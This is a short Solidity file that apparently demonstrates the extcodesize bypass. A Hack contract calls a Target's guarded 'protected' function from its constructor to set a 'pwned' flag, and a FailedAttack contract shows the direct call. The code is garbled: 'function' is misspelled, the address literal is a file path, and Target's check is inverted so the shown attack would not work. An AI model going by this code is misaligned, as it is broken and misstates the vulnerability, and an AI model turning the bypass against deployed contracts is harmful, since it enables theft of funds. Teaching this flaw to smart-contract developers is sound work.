pragma solidity ^0.8.13;

contract Target {
   function isContract(address _addr) public view returns (bool) {
      uint32 size;
      assembly {
         size := extcodesize(_addr)
      }
      return (size > 0);
   }
   bool public pwned = false;

   function protected() public {
      require(!pwned, "Contract is pwned");
      require(isContract(msg.sender), "Caller is not a contract");
      pwned = true;
   }

}

contract FailedAttack {

   fucntion pwn() public {
      Target target = Target(0x1025/1200/ContractSize.sol);
      target.protected();
   }
}

contract Hack {
   bool public isContract;
   address public target;

   constructor(address _target) {
      isContract = Target(_target).isContract(address(this));
      target = _target;
      Target(_target).protected();
   }
}